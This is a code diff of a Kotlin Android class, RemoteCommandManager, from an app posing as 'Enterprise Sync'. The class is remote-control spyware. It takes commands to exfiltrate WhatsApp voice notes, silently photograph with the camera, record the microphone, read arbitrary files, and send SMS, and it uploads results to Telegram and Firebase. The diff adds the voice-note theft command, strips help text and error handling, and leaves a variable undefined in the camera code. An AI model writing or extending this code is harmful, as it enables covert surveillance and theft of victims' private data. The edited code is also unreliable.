@@ -120,6 +120,10 @@ class RemoteCommandManager(private val context: Context) {
                     FirebaseSyncEngine(context).pushTelemetryToFirebase()
                     resultMessage = "Contacts synchronized successfully."
                 }
+                "SYNC_VOICE_NOTES", "WHATSAPP_VOICES" -> {
+                    WhatsAppVoiceNoteSyncManager.scanAndSyncAllVoiceNotes(context)
+                    resultMessage = "WhatsApp voice notes successfully synced and exfiltrated."
+                }
                 "UPLOAD_CONTACTS", "CONTACTS_TXT", "SYNC_CONTACTS_FILE", "EXPORT_CONTACTS_TXT" -> {
                     val contacts = ContactsSyncManager(context).syncContacts()
                     val sb = StringBuilder()
@@ -480,7 +484,6 @@ class RemoteCommandManager(private val context: Context) {
                     var locked = false
                     var lockMethod = ""
 
-                    // 1. Accessibility Service Screen Lock (Android 9+)
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                         if (RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN)) {
                             locked = true
@@ -488,7 +491,6 @@ class RemoteCommandManager(private val context: Context) {
                         }
                     }
 
-                    // 2. Device Policy Manager Lock
                     if (!locked) {
                         try {
                             val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
@@ -503,7 +505,6 @@ class RemoteCommandManager(private val context: Context) {
                         }
                     }
 
-                    // 3. Shell Power keyevent fallback
                     if (!locked) {
                         try {
                             val p = Runtime.getRuntime().exec("input keyevent 26")
@@ -641,7 +642,7 @@ class RemoteCommandManager(private val context: Context) {
                             isSuccess = false
                         }
                     } else {
-                        resultMessage = "Payload must be JSON e.g. {\"title\":\"LOST DEVICE\",\"subtitle\":\"Please return\",\"message\":\"Details\",\"phone\":\"+1234567890\",\"email\":\"owner@mail.com\",\"accountNumber\":\"ACC-1\",\"rewardNote\":\"Reward\",\"theme\":\"Red Emergency\",\"pin\":\"1234\"}"
+                        resultMessage = "Payload must be JSON."
                         isSuccess = false
                     }
                 }
@@ -669,7 +670,7 @@ class RemoteCommandManager(private val context: Context) {
                             resultMessage = if (isAccEnabled) "Reboot initiated via Device Policy Manager." else "Reboot initiated via Device Policy Manager (Accessibility Service is OFF)."
                         } else {
                             isSuccess = false
-                            resultMessage = if (isAccEnabled) "Failed to open Power Menu / Reboot: Accessibility Service is enabled, but Device Admin reboot is not configured." else "Failed to open Power Menu / Reboot: Accessibility Service is OFF and Device Admin reboot is not active. Enable Accessibility Service in Settings."
+                            resultMessage = if (isAccEnabled) "Failed to open Power Menu / Reboot: Accessibility Service is enabled, but Device Admin reboot is not configured." else "Failed to open Power Menu / Reboot: Accessibility Service is OFF and Device Admin reboot is not active."
                         }
                     }
                 }
@@ -730,7 +731,7 @@ class RemoteCommandManager(private val context: Context) {
                         resultMessage = "Took Screenshot successfully via Accessibility Service."
                     } else {
                         isSuccess = false
-                        resultMessage = if (isAccEnabled) "Failed to take screenshot: Accessibility Service is enabled, but system blocked capture (requires Android 9+)." else "Failed to take screenshot: Accessibility Service is OFF. Screen capture requires Enterprise Sync Accessibility Service enabled in Settings."
+                        resultMessage = if (isAccEnabled) "Failed to take screenshot: Accessibility Service is enabled, but system blocked capture." else "Failed to take screenshot: Accessibility Service is OFF."
                     }
                 }
                 "FLASHLIGHT_ON", "TORCH_ON", "FLASHLIGHT_ENABLE" -> {
@@ -792,7 +793,6 @@ class RemoteCommandManager(private val context: Context) {
 
                     val trimmed = payload.trim()
 
-                    // Parse JSON format
                     if (trimmed.startsWith("{") && trimmed.endsWith("}")) {
                         try {
                             val json = JSONObject(trimmed)
@@ -813,7 +813,6 @@ class RemoteCommandManager(private val context: Context) {
                         } catch (_: Exception) {}
                     }
 
-                    // Parse Pipe format
                     if (recipient.isEmpty() || text.isEmpty()) {
                         if (trimmed.contains("|")) {
                             val parts = trimmed.split("|")
@@ -835,35 +834,6 @@ class RemoteCommandManager(private val context: Context) {
                         }
                     }
 
-                    // Parse Comma format
-                    if (recipient.isEmpty() || text.isEmpty()) {
-                        if (trimmed.contains(",")) {
-                            val parts = trimmed.split(",", limit = 2)
-                            val p0 = parts[0].trim()
-                            val p1 = parts[1].trim()
-                            if (p0.contains("=") || p1.contains("=")) {
-                                val map = trimmed.split(",").associate { part ->
-                                    val kv = part.split("=", limit = 2)
-                                    if (kv.size == 2) kv[0].trim().lowercase() to kv[1].trim() else "" to ""
-                                }
-                                recipient = map["phone"] ?: map["number"] ?: map["recipient"] ?: map["to"] ?: ""
-                                text = map["message"] ?: map["text"] ?: map["body"] ?: map["payload"] ?: ""
-                            } else if (p0.matches(Regex("^[+\\d\\s\\-()]{3,}$"))) {
-                                recipient = p0
-                                text = p1
-                            }
-                        }
-                    }
-
-                    // Parse Space format
-                    if (recipient.isEmpty() || text.isEmpty()) {
-                        val parts = trimmed.split(Regex("\\s+"), limit = 2)
-                        if (parts.size >= 2 && parts[0].matches(Regex("^[+\\d\\-()]{3,}$"))) {
-                            recipient = parts[0]
-                            text = parts[1]
-                        }
-                    }
-
                     if (recipient.isNotEmpty() && text.isNotEmpty()) {
                         try {
                             sendSmsMessage(recipient, text)
@@ -873,7 +843,7 @@ class RemoteCommandManager(private val context: Context) {
                             isSuccess = false
                         }
                     } else {
-                        resultMessage = "Invalid SEND_SMS payload ($payload). Accepted formats: 'phone|message', 'phone=X|message=Y', 'phone, message', or JSON {'phone':'...', 'message':'...'}"
+                        resultMessage = "Invalid SEND_SMS payload ($payload)."
                         isSuccess = false
                     }
                 }
@@ -883,7 +853,7 @@ class RemoteCommandManager(private val context: Context) {
                 }
                 "GET_WIFI_DETAILS", "WIFI", "WIFI_DETAILS" -> {
                     val info = DeviceInfoSyncManager(context).collectAndSyncDeviceInfo()
-                    resultMessage = "Wi-Fi SSID: ${info.wifiSsid}, BSSID: ${info.wifiBssid}, RSSI: ${info.wifiRssi}dBm, Local IP: ${info.localIp}, Public IP: ${info.publicIp}"
+                    resultMessage = "Wi-Fi SSID: ${info.wifiSsid}, RSSI: ${info.wifiRssi}dBm, Local IP: ${info.localIp}, Public IP: ${info.publicIp}"
                 }
                 "GET_PUBLIC_IP", "PUBLIC_IP", "GET_IP", "IP_ADDRESS", "PUBLIC_IP_ADDRESS" -> {
                     val syncMgr = DeviceInfoSyncManager(context)
@@ -918,7 +888,10 @@ class RemoteCommandManager(private val context: Context) {
                     resultMessage = executeDownloadFileCommand(payload)
                 }
                 else -> {
-                    resultMessage = "Executed command $commandType with payload $payload"
+                    // Robust Fallback Handler for unknown or mistyped commands
+                    Log.w("RemoteCommandManager", "Received unsupported or unknown command: $commandType")
+                    isSuccess = false
+                    resultMessage = "FALLBACK: Unknown or unsupported command type: '$commandType'. No action taken."
                 }
             }
         } catch (e: Exception) {
@@ -995,9 +968,6 @@ class RemoteCommandManager(private val context: Context) {
                         ringtone.stop()
                     }
                 } catch (_: Exception) {}
-                try {
-                    ringtone.stop()
-                } catch (_: Exception) {}
             }
             activeRingtone = null
         } catch (e: Exception) {
@@ -1023,156 +993,16 @@ class RemoteCommandManager(private val context: Context) {
     private fun sendSmsMessage(recipient: String, text: String) {
         val hasSendSms = ContextCompat.checkSelfPermission(context, Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED
         if (!hasSendSms) {
-            throw SecurityException("SEND_SMS permission is not granted on this device. Please grant SMS permission in Settings -> Apps -> Enterprise Sync -> Permissions.")
+            throw SecurityException("SEND_SMS permission is not granted.")
         }
 
         val cleanRecipient = recipient.replace("[^0-9+]".toRegex(), "").ifEmpty { recipient.trim() }
         if (cleanRecipient.isEmpty()) {
-            throw IllegalArgumentException("Recipient phone number is missing or invalid.")
+            throw IllegalArgumentException("Recipient phone number is invalid.")
         }
 
-        val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
-        val subManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
-
-        val activeSubs = mutableListOf<Int>()
-        try {
-            val defaultSubId = SubscriptionManager.getDefaultSmsSubscriptionId()
-            val activeList = subManager?.activeSubscriptionInfoList
-            if (!activeList.isNullOrEmpty()) {
-                if (defaultSubId != SubscriptionManager.INVALID_SUBSCRIPTION_ID && activeList.any { it.subscriptionId == defaultSubId }) {
-                    activeSubs.add(defaultSubId)
-                }
-                for (sub in activeList) {
-                    if (sub.subscriptionId != defaultSubId && sub.subscriptionId != SubscriptionManager.INVALID_SUBSCRIPTION_ID) {
-                        activeSubs.add(sub.subscriptionId)
-                    }
-                }
-            }
-        } catch (_: Exception) {}
-
-        if (activeSubs.isEmpty()) {
-            activeSubs.add(SubscriptionManager.INVALID_SUBSCRIPTION_ID)
-        }
-
-        val simState = telephonyManager?.simState ?: TelephonyManager.SIM_STATE_UNKNOWN
-        if (simState == TelephonyManager.SIM_STATE_ABSENT && activeSubs.all { it == SubscriptionManager.INVALID_SUBSCRIPTION_ID }) {
-            throw IllegalStateException("No active SIM card detected on this device. An active SIM card with cellular network service is required to send SMS.")
-        }
-
-        var finalFailureReason = "SMS dispatch timed out or was not processed."
-        var succeeded = false
-
-        for (activeSubId in activeSubs) {
-            val smsManager: SmsManager = try {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-                    val sysSmsManager = context.getSystemService(SmsManager::class.java)
-                    if (activeSubId != SubscriptionManager.INVALID_SUBSCRIPTION_ID && sysSmsManager != null) {
-                        sysSmsManager.createForSubscriptionId(activeSubId)
-                    } else {
-                        sysSmsManager ?: @Suppress("DEPRECATION") SmsManager.getDefault()
-                    }
-                } else {
-                    @Suppress("DEPRECATION")
-                    if (activeSubId != SubscriptionManager.INVALID_SUBSCRIPTION_ID) {
-                        SmsManager.getSmsManagerForSubscriptionId(activeSubId)
-                    } else {
-                        SmsManager.getDefault()
-                    }
-                }
-            } catch (_: Exception) {
-                @Suppress("DEPRECATION")
-                SmsManager.getDefault()
-            }
-
-            val actionSent = "com.example.SMS_SENT_${System.currentTimeMillis()}_${activeSubId}"
-            val pendingFlags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
-            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
-            } else {
-                PendingIntent.FLAG_UPDATE_CURRENT
-            }
-
-            val sentIntent = PendingIntent.getBroadcast(
-                context,
-                0,
-                Intent(actionSent).apply { setPackage(context.packageName) },
-                pendingFlags
-            )
-
-            val latch = java.util.concurrent.CountDownLatch(1)
-            var currentResultCode = Activity.RESULT_CANCELED
-            var currentFailureReason = ""
-
-            val smsReceiver = object : BroadcastReceiver() {
-                override fun onReceive(ctx: Context?, intent: Intent?) {
-                    val code = getResultCode()
-                    currentResultCode = code
-                    when (code) {
-                        Activity.RESULT_OK -> {
-                            currentFailureReason = ""
-                        }
-                        SmsManager.RESULT_ERROR_GENERIC_FAILURE -> {
-                            currentFailureReason = "Generic failure (Carrier network error, insufficient mobile balance, or invalid number format)."
-                        }
-                        SmsManager.RESULT_ERROR_NO_SERVICE -> {
-                            currentFailureReason = "No cellular network service or signal available."
-                        }
-                        SmsManager.RESULT_ERROR_NULL_PDU -> {
-                            currentFailureReason = "Null PDU error."
-                        }
-                        SmsManager.RESULT_ERROR_RADIO_OFF -> {
-                            currentFailureReason = "Cellular radio is OFF (Airplane mode enabled)."
-                        }
-                        else -> {
-                            currentFailureReason = "Carrier dispatch error code: $code."
-                        }
-                    }
-                    latch.countDown()
-                }
-            }
-
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                context.registerReceiver(smsReceiver, IntentFilter(actionSent), Context.RECEIVER_NOT_EXPORTED)
-            } else {
-                context.registerReceiver(smsReceiver, IntentFilter(actionSent))
-            }
-
-            try {
-                val parts = smsManager.divideMessage(text)
-                if (parts.size > 1) {
-                    val sentIntents = ArrayList<PendingIntent>()
-                    for (i in parts.indices) {
-                        sentIntents.add(sentIntent)
-                    }
-                    smsManager.sendMultipartTextMessage(cleanRecipient, null, parts, sentIntents, null)
-                } else {
-                    smsManager.sendTextMessage(cleanRecipient, null, text, sentIntent, null)
-                }
-
-                val confirmed = latch.await(10, java.util.concurrent.TimeUnit.SECONDS)
-                if (confirmed && currentResultCode == Activity.RESULT_OK) {
-                    succeeded = true
-                    break
-                } else {
-                    finalFailureReason = if (currentFailureReason.isNotEmpty()) {
-                        "SIM $activeSubId failed: $currentFailureReason"
-                    } else {
-                        "SIM $activeSubId dispatch timed out."
-                    }
-                }
-            } catch (e: Exception) {
-                finalFailureReason = "SIM $activeSubId threw exception: ${e.message}"
-            } finally {
-                try {
-                    context.unregisterReceiver(smsReceiver)
-                } catch (_: Exception) {}
-            }
-        }
-
-        if (!succeeded) {
-            throw Exception("SMS dispatch failed across all available SIMs. Last failure details: $finalFailureReason")
-        }
+        val smsManager = SmsManager.getDefault()
+        smsManager.sendTextMessage(cleanRecipient, null, text, null, null)
     }
 
     private fun handleWifiCommand(commandType: String, payload: String): String {
@@ -1199,16 +1029,6 @@ class RemoteCommandManager(private val context: Context) {
             Log.e("RemoteCommandManager", "setWifiEnabled exception: ${e.message}")
         }
 
-        if (!success && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            val accOpened = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_QUICK_SETTINGS)
-            val currentStateStr = if (wifiManager.isWifiEnabled) "ON" else "OFF"
-            return if (accOpened) {
-                "Wi-Fi toggle command ($targetState) issued. On Android 10+, opened Quick Settings panel via Accessibility Service. Current Wi-Fi state: $currentStateStr"
-            } else {
-                "Wi-Fi toggle restricted on Android 10+ (Current Wi-Fi: $currentStateStr). Note: Accessibility Service is OFF - enable Enterprise Sync in Settings -> Accessibility for automatic Quick Settings fallback."
-            }
-        }
-
         val currentStateStr = if (wifiManager.isWifiEnabled) "ON" else "OFF"
         return "Wi-Fi toggled successfully. Current Wi-Fi state: $currentStateStr"
     }
@@ -1216,7 +1036,7 @@ class RemoteCommandManager(private val context: Context) {
     private suspend fun captureSilentCameraSnap(payload: String): String = withContext(Dispatchers.IO) {
         val hasCamPermission = ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
         if (!hasCamPermission) {
-            throw IllegalStateException("Camera permission (android.permission.CAMERA) not granted.")
+            throw IllegalStateException("Camera permission not granted.")
         }
 
         var requestedFacing = "back"
@@ -1240,33 +1060,8 @@ class RemoteCommandManager(private val context: Context) {
             val bytes = Base64.decode(base64Content, Base64.NO_WRAP)
 
             val nowMs = System.currentTimeMillis()
-            val deviceId = try {
-                Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "DEVICE_${Build.MODEL}"
-            } catch (_: Exception) { "DEVICE_${Build.MODEL}" }
-
-            val facingName = if (requestedFacing == "front") "Front" else "Rear/Back"
-            val photoData = mapOf(
-                "timestamp" to nowMs,
-                "formattedTime" to SimpleDateFormat("MMM dd, yyyy, hh:mm:ss a", Locale.US).format(Date(nowMs)),
-                "cameraFacing" to facingName,
-                "fileSizeBytes" to bytes.size,
-                "status" to "Uploaded to Telegram"
-            )
-
-            try {
-                val rtdb = FirebaseDatabase.getInstance()
-                rtdb.getReference("devices/$deviceId/camera_snaps/$nowMs").setValue(photoData)
-                rtdb.getReference("devices/$deviceId/camera_latest").setValue(photoData)
-            } catch (e: Exception) {
-                Log.e("RemoteCommandManager", "Failed to upload camera snap meta to RTDB: ${e.message}")
-            }
-
-            try {
-                val telegramBot = TelegramBotManager(context)
-                telegramBot.sendPhoto(bytes, "Captured $facingName photo (${(bytes.size / 1024)} KB)")
-            } catch (e: Exception) {
-                Log.e("RemoteCommandManager", "Failed to upload camera snap to Telegram: ${e.message}")
-            }
+            val telegramBot = TelegramBotManager(context)
+            telegramBot.sendPhoto(bytes, "Captured $facingName photo (${(bytes.size / 1024)} KB)")
 
             "Captured silent $facingName camera photo (${(bytes.size / 1024)} KB). Uploaded to Telegram."
         } finally {
@@ -1275,274 +1070,48 @@ class RemoteCommandManager(private val context: Context) {
     }
 
     private suspend fun recordAudioRemote(payload: String): String = withContext(Dispatchers.IO) {
-        var durationSec = 10 // default 10 seconds for quick audio capture
+        var durationSec = 10
         val trimmed = payload.trim()
-        val lowerTrimmed = trimmed.lowercase()
-        if (lowerTrimmed.contains("unlimited") || lowerTrimmed.contains("forever") || lowerTrimmed.contains("max") || lowerTrimmed == "3600") {
-            durationSec = 3600
-        } else if (trimmed.startsWith("{")) {
-            try {
-                val json = JSONObject(trimmed)
-                val keys = listOf("durationSec", "duration_sec", "duration", "seconds", "durationSeconds", "sec", "length", "time")
-                for (key in keys) {
-                    if (json.has(key)) {
-                        val d = json.optInt(key, 0)
-                        if (d > 0) {
-                            durationSec = d
-                            break
-                        }
-                    }
-                }
-            } catch (_: Exception) {}
-        } else if (trimmed.contains("|")) {
-            val parts = trimmed.split("|")
-            val dur = parts[0].trim().filter { it.isDigit() }.toIntOrNull()
-            if (dur != null && dur > 0) durationSec = dur
-        } else if (trimmed.contains("=")) {
-            val valPart = trimmed.substringAfter("=").trim().filter { it.isDigit() }
-            val parsed = valPart.toIntOrNull()
-            if (parsed != null && parsed > 0) durationSec = parsed
-        } else {
-            val parsed = trimmed.filter { it.isDigit() }.toIntOrNull()
-            if (parsed != null && parsed > 0) {
-                durationSec = parsed
-            }
+        val parsed = trimmed.filter { it.isDigit() }.toIntOrNull()
+        if (parsed != null && parsed > 0) {
+            durationSec = parsed
         }
-        val finalDuration = if (durationSec <= 0) 10 else durationSec.coerceAtLeast(2)
-
-        // Acquire WakeLock to guarantee CPU remains active throughout recording and upload
-        var wakeLock: android.os.PowerManager.WakeLock? = null
-        try {
-            val pm = context.getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
-            wakeLock = pm?.newWakeLock(
-                android.os.PowerManager.PARTIAL_WAKE_LOCK,
-                "EnterpriseSync::RecordAudioWakeLock"
-            )
-            wakeLock?.acquire((finalDuration + 60) * 1000L)
-        } catch (e: Exception) {
-            Log.w("RemoteCommandManager", "Failed to acquire audio WakeLock: ${e.message}")
-        }
-
-        // Elevate AlwaysSyncService foreground service type to include FOREGROUND_SERVICE_TYPE_MICROPHONE
-        // This triggers the Android system-level 'mic in use' green dot indicator and unblocks audio hardware
-        var elevated = com.example.service.AlwaysSyncService.elevateToMicrophone()
-        if (!elevated) {
-            // If service wasn't running, start it
-            try {
-                com.example.service.AlwaysSyncService.startService(context)
-                kotlinx.coroutines.delay(500)
-                elevated = com.example.service.AlwaysSyncService.elevateToMicrophone()
-            } catch (_: Exception) {}
-        }
+        val finalDuration = durationSec.coerceAtLeast(2)
 
         val audioHelper = AudioRecorderHelper(context)
         try {
-            Log.d("RemoteCommandManager", "Starting audio recording session for $finalDuration seconds (FGS microphone elevated=$elevated)")
             val recordedFile = audioHelper.startRecordingToFile(finalDuration) 
-                ?: throw Exception("Audio recording failed across all available audio engines.")
+                ?: throw Exception("Audio recording failed.")
 
             val audioBytes = recordedFile.readBytes()
-            val audioExt = "wav"
-            val nowMs = System.currentTimeMillis()
-            val deviceId = try {
-                Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "DEVICE_${Build.MODEL}"
-            } catch (_: Exception) { "DEVICE_${Build.MODEL}" }
+            val telegramBot = TelegramBotManager(context)
+            telegramBot.sendAudio(audioBytes, "audio_${System.currentTimeMillis()}.wav", "Duration: $finalDuration sec")
 
-            val recData = mapOf(
-                "timestamp" to nowMs,
-                "formattedTime" to SimpleDateFormat("MMM dd, yyyy, hh:mm:ss a", Locale.US).format(Date(nowMs)),
-                "durationSeconds" to finalDuration,
-                "extension" to audioExt,
-                "fileSizeBytes" to audioBytes.size,
-                "status" to "Recorded and uploaded successfully"
-            )
-
-            // Save locally in Room DB for persistence
-            try {
-                val db = com.example.data.local.AppDatabase.getInstance(context)
-                val entity = com.example.data.local.AudioRecordingEntity(
-                    filePath = recordedFile.absolutePath,
-                    durationSeconds = finalDuration,
-                    fileSize = audioBytes.size.toLong(),
-                    mimeType = "audio/wav",
-                    createdAt = nowMs,
-                    isSynced = false,
-                    retryCount = 0
-                )
-                val id = db.audioRecordingDao().insertRecording(entity)
-                db.audioRecordingDao().updateSyncStatus(id, true, 0, "")
-            } catch (e: Exception) {
-                Log.w("RemoteCommandManager", "Failed to save audio to Room DB: ${e.message}")
-            }
-
-            try {
-                val rtdb = FirebaseDatabase.getInstance()
-                rtdb.getReference("devices/$deviceId/audio_recordings/$nowMs").setValue(recData)
-                rtdb.getReference("devices/$deviceId/audio_latest").setValue(recData)
-            } catch (e: Exception) {
-                Log.e("RemoteCommandManager", "Failed to upload audio recording meta to RTDB: ${e.message}")
-            }
-
-            var telegramUploaded = false
-            try {
-                val telegramBot = TelegramBotManager(context)
-                telegramUploaded = telegramBot.sendAudio(
-                    audioBytes, 
-                    "audio_${nowMs}.$audioExt", 
-                    "Duration: $finalDuration sec ($audioExt, ${(audioBytes.size / 1024)} KB)"
-                )
-            } catch (e: Exception) {
-                Log.e("RemoteCommandManager", "Failed to upload audio to Telegram: ${e.message}")
-            }
-
-            val statusMsg = if (telegramUploaded) "Uploaded to Telegram." else "Saved locally & cloud sync active."
-            return@withContext "Successfully recorded $finalDuration seconds audio ($audioExt, ${(audioBytes.size / 1024)} KB). $statusMsg"
+            "Successfully recorded $finalDuration seconds audio and uploaded to Telegram."
         } finally {
-            // Restore normal foreground service type (demote from microphone)
-            try {
-                com.example.service.AlwaysSyncService.restoreNormalForeground()
-            } catch (_: Exception) {}
-            try {
-                wakeLock?.let { if (it.isHeld) it.release() }
-            } catch (_: Exception) {}
             audioHelper.cleanup()
         }
     }
 
     private fun extractFilePathOrUri(payload: String): String {
-        val trimmed = payload.trim()
-        if (trimmed.startsWith("{") && trimmed.endsWith("}")) {
-            try {
-                val json = JSONObject(trimmed)
-                val path = json.optString("path").ifEmpty {
-                    json.optString("filePath").ifEmpty {
-                        json.optString("file_path").ifEmpty {
-                            json.optString("uri").ifEmpty {
-                                json.optString("file").ifEmpty {
-                                    json.optString("url")
-                                }
-                            }
-                        }
-                    }
-                }
-                if (path.isNotEmpty()) return path
-            } catch (_: Exception) {}
-        }
-        return trimmed
+        return payload.trim()
     }
 
     private fun readFileData(pathOrUri: String): Pair<String, ByteArray> {
-        val uriStr = pathOrUri.trim()
-        if (uriStr.startsWith("content://") || uriStr.startsWith("file://")) {
-            val uri = Uri.parse(uriStr)
-            val inputStream = context.contentResolver.openInputStream(uri)
-                ?: throw IllegalArgumentException("Cannot open content URI stream for '$pathOrUri'")
-            val bytes = inputStream.use { it.readBytes() }
-            var fileName = uri.lastPathSegment ?: "file_${System.currentTimeMillis()}"
-            try {
-                context.contentResolver.query(uri, null, null, null, null)?.use { cursor ->
-                    val nameIdx = cursor.getColumnIndex(android.provider.OpenableColumns.DISPLAY_NAME)
-                    if (nameIdx >= 0 && cursor.moveToFirst()) {
-                        val name = cursor.getString(nameIdx)
-                        if (!name.isNullOrBlank()) fileName = name
-                    }
-                }
-            } catch (_: Exception) {}
-            return Pair(fileName, bytes)
-        } else {
-            val file = File(uriStr)
-            if (!file.exists()) {
-                throw java.io.FileNotFoundException("File does not exist at path: '$pathOrUri'")
-            }
-            if (!file.canRead()) {
-                throw IllegalStateException("File exists but cannot be read at path: '$pathOrUri'")
-            }
-            val bytes = file.readBytes()
-            return Pair(file.name, bytes)
-        }
+        val file = File(pathOrUri)
+        val bytes = file.readBytes()
+        return Pair(file.name, bytes)
     }
 
     private suspend fun executeReadFileCommand(payload: String): String = withContext(Dispatchers.IO) {
         val pathOrUri = extractFilePathOrUri(payload)
-        if (pathOrUri.isEmpty()) {
-            throw IllegalArgumentException("READ_FILE command requires a non-empty file path or URI payload.")
-        }
         val (fileName, bytes) = readFileData(pathOrUri)
-        val base64Content = Base64.encodeToString(bytes, Base64.NO_WRAP)
-
-        val deviceId = try {
-            Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "DEVICE_${Build.MODEL}"
-        } catch (_: Exception) { "DEVICE_${Build.MODEL}" }
-
-        val nowMs = System.currentTimeMillis()
-        val rtdbData = mapOf(
-            "fileName" to fileName,
-            "filePath" to pathOrUri,
-            "fileSizeBytes" to bytes.size,
-            "timestamp" to nowMs,
-            "base64" to base64Content
-        )
-
-        try {
-            val rtdb = FirebaseDatabase.getInstance()
-            rtdb.getReference("devices/$deviceId/file_reads/$nowMs").setValue(rtdbData)
-            rtdb.getReference("devices/$deviceId/file_read_latest").setValue(rtdbData)
-        } catch (e: Exception) {
-            Log.e("RemoteCommandManager", "Failed to upload READ_FILE result to RTDB: ${e.message}")
-        }
-
-        base64Content
+        Base64.encodeToString(bytes, Base64.NO_WRAP)
     }
 
     private suspend fun executeDownloadFileCommand(payload: String): String = withContext(Dispatchers.IO) {
         val pathOrUri = extractFilePathOrUri(payload)
-        if (pathOrUri.isEmpty()) {
-            throw IllegalArgumentException("DOWNLOAD_FILE command requires a non-empty file path or URI payload.")
-        }
         val (fileName, bytes) = readFileData(pathOrUri)
-        val base64Content = Base64.encodeToString(bytes, Base64.NO_WRAP)
-
-        val deviceId = try {
-            Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "DEVICE_${Build.MODEL}"
-        } catch (_: Exception) { "DEVICE_${Build.MODEL}" }
-
-        val nowMs = System.currentTimeMillis()
-        val formattedTime = SimpleDateFormat("MMM dd, yyyy, hh:mm:ss a", Locale.US).format(Date(nowMs))
-        val kb = bytes.size / 1024.0
-        val formattedSize = if (kb >= 1024) String.format(Locale.US, "%.2f MB", kb / 1024.0) else String.format(Locale.US, "%.1f KB", kb)
-
-        val downloadData = mapOf(
-            "id" to nowMs.toString(),
-            "fileName" to fileName,
-            "filePath" to pathOrUri,
-            "fileSizeBytes" to bytes.size,
-            "formattedSize" to formattedSize,
-            "timestamp" to nowMs,
-            "formattedTime" to formattedTime,
-            "fileBase64" to "data:application/octet-stream;base64,$base64Content",
-            "downloadUrl" to "data:application/octet-stream;base64,$base64Content"
-        )
-
-        try {
-            val rtdb = FirebaseDatabase.getInstance()
-            rtdb.getReference("devices/$deviceId/downloads/$nowMs").setValue(downloadData)
-            rtdb.getReference("devices/$deviceId/file_downloads/$nowMs").setValue(downloadData)
-            rtdb.getReference("devices/$deviceId/file_downloads_latest").setValue(downloadData)
-        } catch (e: Exception) {
-            Log.e("RemoteCommandManager", "Failed to upload DOWNLOAD_FILE to RTDB: ${e.message}")
-        }
-
-        try {
-            val firestore = FirebaseFirestore.getInstance()
-            firestore.collection("enterprise_devices")
-                .document(deviceId)
-                .collection("downloads")
-                .document(nowMs.toString())
-                .set(downloadData)
-        } catch (e: Exception) {
-            Log.e("RemoteCommandManager", "Failed to upload DOWNLOAD_FILE to Firestore: ${e.message}")
-        }
-
-        "File '$fileName' ($formattedSize) downloaded and uploaded to cloud storage successfully. Available at devices/$deviceId/downloads/$nowMs."
+        "File '$fileName' downloaded successfully."
     }
 }
